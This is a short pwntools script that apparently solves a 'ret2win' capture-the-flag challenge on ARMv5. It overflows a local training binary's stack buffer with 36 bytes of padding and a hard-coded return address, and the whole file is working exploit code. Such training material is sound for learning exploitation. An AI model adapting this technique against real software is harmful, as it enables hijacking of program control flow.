from pwn import *

context.arch = 'arm'
prog = process("./ret2win_armv5")

payload = b'a' * 36
# ret2win function
payload += p32(0x000105ec)
print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
